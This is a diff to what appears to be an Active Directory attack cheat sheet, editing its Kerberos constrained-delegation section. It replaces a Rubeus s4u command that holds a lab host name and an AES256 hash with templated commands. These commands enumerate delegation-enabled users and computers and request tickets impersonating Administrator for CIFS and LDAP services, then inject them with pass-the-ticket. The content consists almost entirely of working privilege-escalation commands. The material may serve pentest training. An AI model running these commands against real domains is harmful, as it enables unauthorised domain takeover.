@@ -118,13 +118,17 @@ C:> Rubeus.exe ptt /ticket:<Base64EncodedTicket>
 # Get users with Constraied delegation
 C:> . .\PowerView.ps1
 C:> Get-DomainUser -TrustedToAuth
+
+# Request a TGS for user as Domain Administrator for CIFS on host
+C:> Rubeus.exe s4u /user:<user> /aes256:<user_aes_hash> /impersonateuser:Administrator /msdsspn:"CIFS/<host_fqdn>" /ptt
 ```
 ```powershell
-# Request a TGS
-C:> C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
+# Get Computer Accounts with Constrained Delegation
+C:> Get-DomainComputer -TrustedToAuth
 
-
-
+# Impersonate User Administrator using the host account
+C:> Rubeus.exe s4u /user:<host_account>$ /aes256:<host_aes_hash> /impersonateuser:Administrator /msdsspn:time/<host_Fqdn> /altservice:ldap /ptt
+```
 
 
 
